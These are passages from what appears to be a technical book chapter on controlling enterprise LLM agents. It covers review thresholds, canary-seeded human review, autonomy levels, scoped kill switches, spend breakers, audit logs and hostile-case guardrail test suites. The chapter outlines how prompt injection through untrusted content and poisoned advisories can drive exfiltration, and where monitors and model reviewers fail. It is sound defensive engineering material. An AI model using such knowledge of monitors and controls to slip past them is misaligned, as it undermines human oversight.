ece9888217: Example 11 simulates 20,000 decisions. Most are easy, a minority are hard, and the score is calibrated by construction. The example sweeps the auto-approve threshold and reports four things: the share automated; the escaped error, meaning the share of all decisions that are both auto-approved and wrong; the reviews per day; and the reviewers needed for 6,000 decisions a day at 90 seconds a review and 70 percent utilisation. The error budget from the card says at most 1 percent of all decisions may be wrong and unreviewed.
47cb782f91:
Read the shape, not just the row.

The first half of the sweep buys a lot. Moving from 0.70 to 0.85 cuts escaped errors from 2.97 to 0.68 percent, for about three more reviewers. After 0.85 the curve goes flat. The residual errors come from cases the score rates as easy that are wrong anyway. No threshold fixes those, and pushing it higher only adds reviewers (8.6 at 0.95 for a 0.28 point gain).

The decision is the lowest threshold that meets the budget (0.85), not the lowest error. The last line of the example's output states the discipline: if the staffing is not available, the answer is not a lower threshold; it is a smaller scope or a slower SLA.

Picture a team that can't staff 7.7 reviewers and quietly sets the threshold at 0.70. It has spent the whole error budget three times over without recording the decision. Record it, with the number, in the ADR.
9a4bb1118f:
Two more checks belong with the threshold.

The residual errors, the 0.4 percent that no threshold removes, are why the auto route is sampled. A 5 percent sample of auto-approved decisions, reviewed by people, gives a measured escaped-error rate with a confidence interval (ch 11). Without it the figure is a simulation result, not a production fact.

Then the drift check. Calibration decays as inputs shift. Recompute it monthly, and alert when the observed error among scores of 0.9 and above exceeds 10 percent relative to the calibration run. A threshold chosen once and never revisited is a control that has stopped being measured.
a0949738bf:
Section 2 introduced automation bias: people who monitor a mostly reliable system stop checking independently. Human review of model output reproduces the effect strongly. The model's proposals are fluent, usually right, and arrive at a steady pace. A reviewer who approves 98 of 100 proposals and is rarely wrong learns that approving is the efficient policy.

The result is a control that appears on the architecture diagram and contributes nothing. The cost stays invisible until the one case it was supposed to catch passes through. An architect can't fix the psychology. An architect can measure it and design around it.
a4a3f8e25b:
There are three measurements.

  • Decision time: a median review of two seconds on a case that needs to be read is not a review.
  • Approval rate: very high rates are suspicious but ambiguous. A good upstream system also produces high approval rates, so the rate alone can't convict.
  • Seeded canaries: known-bad cases inserted into the queue at a low rate (say 5 percent), indistinguishable from real ones, whose outcome is known.

The canary catch rate directly measures whether the reviewer catches errors. It's the only one of the three that does.

Example 12 simulates two reviewers on 400 cases each, with one case in twenty a canary. Alice spends 25 to 90 seconds and catches 95 percent of canaries. Bob spends 1 to 4 seconds and catches 10 percent.
fb260c284f:
Canaries need care.

  • They must be realistic: replayed from real, redacted past errors.
  • They must be refreshed, so reviewers can't memorise them.
  • They must never turn into penalties without context. A catch-rate alert triggers coaching and a queue review before it triggers anything else.
  • They must stay out of customer-visible effects. A canary the reviewer approves must be stopped by the same gate that stops any real error, and it must be logged as a canary.

Other design responses are cheaper than they sound. Make the default action a rejection or escalation rather than approval, so doing nothing is safe. Require a reason code for approvals above a risk level; it slows the click enough to make reading likelier. Randomise which cases get a second reviewer. Cap session length.

None of these is as informative as the canary. Together they make it harder for a reviewer to become a rubber stamp.
92bd1a24c7:
The same logic applies to model-based review. A second model that checks the first model's decision is a reviewer too, with the same weaknesses. It can agree with fluent output. And if it shares the model, the prompt style or the retrieved context with the first, it shares its blind spots, so the two are closer to one slice of cheese than two.

LLM-as-judge has a legitimate place in evaluation (ch 11) and in screening drafts for tone. It's a poor substitute for a deterministic check on a rule you can't afford to see broken. If you use a model reviewer, seed it with canaries too, and measure its catch rate the same way.
2aad213635:
The Sheridan and Verplank scale, as refined by Parasuraman and colleagues, becomes four levels for an enterprise agent:

  • Level 0, suggest: the agent drafts and a person acts.
  • Level 1, approve: the agent prepares the action and a person approves it before it happens.
  • Level 2, act and notify: the agent acts within limits and informs a person or the customer, and the action is reversible within a window.
  • Level 3, act within limits: the agent acts and the system samples outcomes.

The level belongs to an action class, not to the agent. One agent may sit at level 2 for status messages, level 1 for credits up to ten dollars and level 0 for plan changes, and be forbidden from closing accounts.
219e0911f1:
The governance content is in the asymmetry between promotion and demotion.

Promotion is slow, because it increases exposure. It needs enough decisions for the observed error rate to mean something. (1,000 decisions at 0.4 percent is about four errors, so even this is a weak estimate; ch 11 shows the interval.) It needs a reversibility window short enough that an error can be undone. And it needs a named person's sign-off.

Demotion is fast, because it decreases exposure and a false alarm costs only some review time. The first breach of a limit, a spike in escaped errors, or a failed canary check drops the class one level automatically and notifies the owner.

A system whose autonomy can only be raised by a committee and only lowered by a committee will drift upward until an incident lowers it for them.
b0fb64fe4b:
One more rule: autonomy is capped by the worst of the four levers in section 3. An action class with an uncapped tool, a service-account credential or an open egress path can't be at level 3, however good its measured error rate. The error rate describes ordinary behaviour. The levers bound hostile behaviour.

In review this reads as a checklist. For level 2 or above:

  • the gate has per-action and cumulative limits;
  • the credential is user-scoped;
  • the action is idempotent and reversible within the window;
  • a kill switch for the class exists;
  • the audit row contains the inputs, the prompt version and the model id.
197f97310c:
A kill switch is the control you hope never to use, and you design it as if you'll use it tomorrow. Its requirements are simple to state. It stops new effects quickly. It can be scoped: everything, one tenant, one tool, one action class. It doesn't depend on the thing being stopped. And it has been exercised.

Knight Capital, section 2, had none of these. The design questions are the scope, the propagation time, and what happens when the switch itself can't be read.
e1b6378975:
Scope matters, because the right response to a bad credit tool is to stop credits, not to take down the whole chat product. Three levels cover most needs:

  • global: all effects stop, and the assistant still answers read-only questions or hands off;
  • tenant: one customer segment or enterprise tenant;
  • tool: one tool or action class.

Propagation is a trade-off with load. If every request reads the flag store, a flag-store outage becomes an outage of the product. If flags are cached for a TTL, a trip takes up to the TTL to bite. With a 5-second TTL, the worst-case time to effect is 5 seconds plus propagation. The flag store then sees one read per key per 5 seconds per instance, not one per request.

State the TTL as a requirement (the card's stop time of 10 seconds), and note that a 60-second TTL would break it. Example 14 simulates the scopes and demonstrates the TTL. With a global trip set, a decision 4.9 seconds later still returns allowed, and one 5.1 seconds later returns refused.
775c73b6d1:
At some point the flag store will be unreachable. What the harness does then is the fail-safe decision, and it's made per action class.

Fail closed means that if the control can't be evaluated, the action is refused. Fail open means it proceeds. Saltzer and Schroeder's fail-safe default says to fail closed. For writes with money or regulated data attached, that's right: an unreadable kill switch must not be a licence to act.

For read-only answers, though, a blanket refusal turns a flag-store outage into a customer-facing outage. So the practical design adds a third state, degraded: answer from retrieved content with no tools, or hand off to a person.

The example encodes it in four lines. A write whose switch can't be read is refused. A read whose switch can't be read runs in degraded mode with no tools.
3b20aa9757: The Java version puts the same logic in a Filter or an AOP aspect in front of the tool dispatcher. It takes a Clock, so tests can advance time; that's what makes TTL behaviour testable without sleeping. And it returns an enum rather than a boolean, so the caller has to handle the degraded state explicitly.
53483c719c:
A kill switch needs a person to throw it. Budgets and breakers are the same idea without the person.

A per-request budget bounds one loop: a maximum number of steps and a maximum spend, enforced by the harness around the loop (ch 2 introduced them for agents). Example 15 scripts a model that calls a search tool fifty times. Without a budget the loop makes 50 calls. With a budget of 8 steps and 50 cents, it stops after 8 calls, at 56 cents, when the dollar limit trips.

A fleet breaker bounds the aggregate. It watches spend (or write count, or refusal rate) over a sliding window, and trips the kill switch when the window exceeds a limit. In the example the baseline is two dollars a minute, a burst begins at fifteen dollars a minute, and the limit is sixty dollars over five minutes. The breaker trips in minute 7, at 62 dollars.

Without the breaker, the burst would continue until someone looked at a dashboard. The breaker turns a runaway from an incident into an alert.
d11ad3871a:
An incident is a control failing in production. The response draws on ordinary SRE practice, with four additions specific to LLM systems:

  • the evidence includes prompts, retrieved context, tool calls and model identifiers, not only logs;
  • containment can be done by capability (turn off one tool) as well as by service;
  • the cause may be a model or data change, with no code deploy to roll back;
  • the fix always includes a new test.

The runbook below is short on purpose. A runbook read during an incident has to be read in a minute.
e09d5a7114:
Example 16 replays a synthetic incident from an audit log. An approval-bypass bug lets credits of $120, $250 and $400 through for one tenant (t2), between minute 60 and minute 100 of a two-hour log, with no approver recorded.

The script first copies the evidence. Then it applies the detection rule (credit applied above $50 with no approver) and finds the first violation at minute 60. A monitor that evaluates a five-minute window fires at minute 65. Containment is a scoped switch for t2, not a global one.

A query then scopes the blast radius: 41 over-limit credits totalling $12,770, all on t2 and none on the other tenants. Of those, 34 happened after the alert fired. That's the number an auto-trip on first violation would have prevented. The remediation list is the audit rows themselves, to be reversed or ratified one by one.
e7cf389b16:
Two more points on incidents.

Severity levels should map to action, not mood. For example, severity 1 is any disclosure of regulated data, or any financial effect over a stated threshold. It gets an incident lead named in 15 minutes, a global or scoped switch decision in 30, and a compliance notification clock started. Severity 3 is a quality regression, handled in the next sprint.

And communicate in facts: what happened, what's affected, what has been stopped, what isn't yet known, and when the next update will arrive. Customers and regulators forgive an incident faster than a vague account of one.

Section 20 lists the evidence the log must already hold before the incident for any of this to work.
8b6824a51a:
Governance in this domain is a set of properties of the running system, and the audit record is where most of them are evidenced. A SOX auditor tests whether a credit above authority had an approver. A privacy officer asks who saw a customer's records, and why. An incident lead asks what the model was shown. One record format can answer all three, if it's designed for them.

The test of the design: from the log alone, can you reconstruct any decision? That means the inputs, the policy in force, what the model proposed, what each gate decided, who approved, and what happened.
f3fe5432f4:
Three design points keep the record useful and lawful.

It must be append-only, with integrity protection (write-once storage or a hash chain). An audit log that an operator can edit is evidence of nothing.

It must be minimised. Store identifiers and hashes rather than raw customer text where the question doesn't need the text. Set retention by the longest legal obligation and no longer (ch 14 for periods and subject-access and erasure obligations). Restrict reads to a role whose reads are themselves logged.

And it must be queryable at incident speed. Example 16 depends on finding every credit above fifty dollars with no approver in a time window. A log that takes a day to query makes the 30-minute scoping target unreachable.

The monitors that read this log, and the dashboards and alerts on top of it, are the subject of chapter 10. This chapter contributes the list of events those monitors need.
3fcc4e1fee:
Other governance properties follow from sections already covered.

  • Change control: a prompt, a tool schema, a threshold or a gate rule is a production change. It gets review, a version, a staged rollout and a rollback, and the evaluation and red-team suites run before it (ch 4 and section 21).
  • Separation of duties: the person who writes a gate rule isn't the only person who approves it, and the person who approves credits isn't the person who sets the limits.
  • Transparency: telling customers when they're talking to an automated system, and giving them a path to a person, is an ethical stance. In some jurisdictions it's also a legal requirement (ch 14 covers the specifics; check the current rules for your regions).
  • Bias and fairness checks belong in the evaluation segments (ch 11). Measure error and refusal rates by customer segment and language, and treat a gap as a defect in the same register.
eec8854de3:
A guardrail that hasn't been attacked in a test is an assumption. The practical form is a regression suite of hostile cases. Each case is a scripted model output (or a recorded real attack) plus the assertion that no effect results. The suite runs on every change to a prompt, tool, gate, model id or policy.

Example 17 builds the smallest useful version: eleven hostile cases in four categories (limit, scope, exfiltration, tool misuse) plus two legitimate calls, run through the harness. A release gate fails the build on any escape. A second assertion checks that legitimate calls still pass.

That second assertion matters as much as the first. A harness that blocks everything has an attack success rate of zero, and it's useless.
4381a6fade:
Report results per category, never as one rate. The reason is the one chapter 1 gave for accuracy: an aggregate hides the category that leaks.

Then be honest about what zero escapes proves. If 200 hostile cases produce no escape, the 95 percent upper bound on the escape rate for that kind of case is about 3 / 200 = 1.5 percent (the rule of three; ch 11 for the exact interval). That's a useful statement, and a weaker one than "the attack success rate is zero".

It also holds only for the distribution of attacks in the suite. That's why the suite grows: every incident, every novel public attack technique and every red-team finding becomes a case.

For the model layer, the same machinery produces an attack success rate: the share of hostile prompts that make the model emit the forbidden action. It's a rate, not a guarantee. Track it per prompt and model version, as an input to the register's occurrence score.
594f4822c7:
Two more tests are specific to this domain.

Mutation tests: disable one layer at a time (comment out the daily cap, remove the recipient check) and confirm that the suite fails. A guardrail whose removal changes no test result isn't covered.

Independence checks: for each high-severity risk, list the layers that stop it, and check that they fail for different reasons. Say the only two controls on a risk are a prompt rule and a model-based output judge built on the same model. Then you have one control that happens to be written twice.

The companion folder's model-free approach runs entire suites in milliseconds with a scripted model. Together with these two tests, it makes guardrail regression cheap enough to run on every commit.
d3be0fa23c:
Two of the most consequential rows are worth seeing as code, because the broken version looks reasonable in review.

Row 8 is the approval queue that auto-approves when an item ages out. The author means to keep customers from waiting. The effect is that the control disappears at peak load, exactly when reviews are slowest and attacks most likely.
6a7c8b03d8:
Row 14 is the log that keeps raw text. A team adds the full prompt and response to the log for debugging. Six months later the log store holds every card number a customer ever typed and every CPNI detail the assistant retrieved, with weaker access control than the systems it came from.

The repair is the design in section 20. Redact on the way in, and store identifiers and hashes. Keep the raw text only in a short-retention, restricted debug store with logged reads. Treat the audit log as a production data store with its own risk row.
6fba635c54: CCAR-P scenarios in this domain have a recognisable structure: a failure, four options, and a correct option that moves the control into code, adds a measured human step, or tightens a lever. Work through each one before you read the reasoning.
dc79fa8f6a:
The control must not depend on the model complying. A tool-level limit turns a probabilistic behaviour into a guarantee, and the readable error lets the model hand off gracefully.

A and D lower the violation rate, but can't reach zero. C detects after the money has moved. It's useful for audit sampling, not as the control.

Add a cumulative cap too, since a loop of legal small credits defeats a per-action limit (section 9).
0760200fa3:
The scenario has all three conditions: private data, untrusted content, an external channel. B removes the channel for unverified addresses (code). It adds a taint rule (code). And it removes the untrusted text from the privileged context (structure).

A and D are probabilistic. C blocks at a base-rate cost and misses paraphrases. As a risk signal it's fine; as the control it isn't.
1194333067:
Approval rate and time are signals, not proof. The canary catch rate is the measurement.

Two reviewers who each click approve are one control at double the cost. A model reviewer has the same weakness, and shares blind spots. D reads a high approval rate as evidence of accuracy, which it isn't when reviewers aren't reading. B measures first, then changes the design where the measurement points.
ffba49b096:
The right behaviour differs by action class. Refusing a write when the control can't be read respects the fail-safe default. Degrading reads keeps the product useful.

The TTL cache also removes the per-request dependency that made the store outage a product outage. The price is up to TTL seconds of staleness, which must still meet the card's stop-time requirement.

A and B are uniform answers to a per-class question. D puts the switch out of operators' reach, since a prompt change is a deploy.
929bc9bb9f:
Construction beats detection. If the model isn't allowed to author the confirmation, it can't fabricate one.

A and C are prompt controls on a failure that appears under error conditions the examples rarely cover. D adds cost, and still leaves a window in which the wrong message was sent.
30143b2692: RPN multiplies ordinal scores, so it under-ranks rare catastrophic failures. That's why the severity override exists. C and D adjust scores to get a result, which defeats the point of the register. The deterministic controls (scope, filters) are inexpensive and testable, so there's no justification for waiting a quarter.
7e2751f6d4: Card and worst case. The ceiling must be small. So: a user-scoped token, and a tool list of read-own-account, apply-credit (gated) and escalate, with no fetch and no free-form email. The worst case of one hijacked request is 3 writes x $50 = $150 and one customer's data (section 3, design B).
29db423ecc: Put each rule where it is enforced. The $50 limit, the $75 daily cap and the 20-an-hour velocity limit live in the tool gate, with an idempotency key. The wrong-account check is the scope comparison. The prompt mirrors the limits so the model doesn't waste turns.
690bfcc17d: Untrusted content. The customer's message and any attached documents are tagged with a nonce delimiter. A message the classifier flags loses its write tools for that turn. The classifier runs only on the 15 percent of traffic that carries attachments or requests a write, at about $225 a day.
c5933c47a6: Hallucination. Answers about rates and policy are claim-structured and verified (quote and numbers). A failure abstains and hands off. Credit confirmations are generated from the tool result. The target is unsupported answers under 0.5 percent per intent, measured by weekly sampling of 200 answers (about a 1 percent interval at that size; ch 11).
c2b4338863: Human step. Credits above $50 go to an approval queue. For sizing, assume 8 percent of 6,000 disputes need approval, which is 480 a day, at 60 seconds each: 480 x 60 / (25,200 x 0.70) = 1.6 reviewers. Plan for 2, with a 4-hour maximum age and expiry to escalation, not approval. Seed canaries at 5 percent, and alert on a catch rate under 90 percent.
bb4982bce9: Autonomy levels. Status messages sit at L2. Credits up to $10 start at L1 and become eligible for L2 after 1,000 decisions at 0.5 percent error or better. Credits from $10 to $50 stay at L1. Plan changes are L0. Account closure is never automated.
b87e60bb82: Operations. The kill switch is scoped by tool and tenant, with a 5-second TTL; writes fail closed and reads degrade. Each request has a budget of 8 steps and $0.50, and the fleet breaker trips at $60 per 5 minutes. The audit record follows section 20, with 7-year retention (illustrative; ch 14).
8bb952a848: Latency. The input code check takes 10 ms, the tool gates 3 x 8 ms, grounding 20 ms and the output scan 10 ms. The policy classifier runs only on customer-facing drafts (450 ms), and the input classifier overlaps with generation. That adds 514 ms against a margin of about 1.5 s.
84dbfd6ade: Register and ADR. The register of section 13, with owners. The ADR records the alternatives rejected: prompt-only limits (fails scenario 1), a second-model judge as the control (it acts after the effect), and service-account credentials (blast radius). Review triggers are any severity 9 event, a canary catch rate under 90 percent, a model-version change, and a fleet-breaker trip.
65ea46d575: Three conditions. Private data (configuration), untrusted content (open-web advisories), and, if the agent could push configuration, an external effect. Remove the third: the agent gets no write tool to network elements.
a8b4a25529: Autonomy. L0 for every change class. The agent drafts a change request with evidence, and a network engineer approves it through the existing CAB. This isn't a limitation to engineer away. It's the correct level when the effect is irreversible within the outage window and severity is 9 or above.
7dc236deea: Quarantine. A tool-less reader summarises each advisory into a schema: product, versions affected, CVE id, workaround present (yes or no). The privileged triage step sees only the structured result. A manipulated reader can emit a wrong field, but not an instruction.
ee7fe0d4c4: Verification. The proposed change must cite the configuration lines and the advisory field it relies on, and code verifies both against the stored copies. A proposal that can't be traced abstains.
01da51c4b5: Reviewer quality. Seed 5 percent of proposals with known-bad changes from past incidents. A catch rate under 90 percent triggers re-review. At 40 proposals a day and 5 minutes each, the queue needs 40 x 300 / (25,200 x 0.7) = 0.7 engineers; budget 1.
b56a172950: Stop and learn. Add a tool-level switch for the advisory reader, in case advisories turn out to be poisoned, and a global switch for the agent. Add an incident rule too: any proposal that reaches CAB with a fabricated citation is severity 2, adds a regression case, and re-scores R3 in the register.
